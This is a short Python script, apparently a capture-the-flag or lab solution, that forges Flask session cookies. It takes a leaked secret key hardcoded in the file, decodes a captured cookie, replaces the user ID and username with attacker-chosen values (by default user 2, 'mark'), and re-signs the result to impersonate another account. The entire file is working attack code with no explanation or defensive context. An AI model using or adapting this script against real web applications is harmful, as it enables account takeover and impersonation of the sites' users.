from itsdangerous import URLSafeTimedSerializer, BadSignature
import json
import sys

user_id = None
username = None
if len(sys.argv) != 3:
    print("Usage: python hijacking_session.py <user_id> <username>")
    print("Using default values: user_id=2, username='mark'")
    user_id = 2
    username = 'mark'
else:
    user_id = sys.argv[1]
    username = sys.argv[2]
    print(f"User ID: {user_id}, Username: {username}")

# Known secret key from the Flask app
secret_key = 'Sup3rS3cr3tKey4rtIfici4L'
cookie = 'eyJ1c2VyX2lkIjoyNSwidXNlcm5hbWUiOiJicm9kZXIifQ.aGqORA.0aoOVJCkdV2UPA3FrKVWousBp48'

# Setup serializer like Flask does for session cookies
def get_serializer(secret_key):
    return URLSafeTimedSerializer(
        secret_key,
        salt='cookie-session',
        serializer=json,
        signer_kwargs={'key_derivation': 'hmac', 'digest_method': 'sha1'}
    )

serializer = get_serializer(secret_key)

# Decode the original cookie
try:
    session_data = serializer.loads(cookie)
    print("[+] Decoded session:", session_data)
except BadSignature as e:
    print("[-] Invalid cookie signature:", e)
    exit()

# Modify session data
session_data['user_id'] = user_id
session_data['username'] = username

# Forge new cookie
new_cookie = serializer.dumps(session_data)
print(f"[+] Forged cookie: {new_cookie}")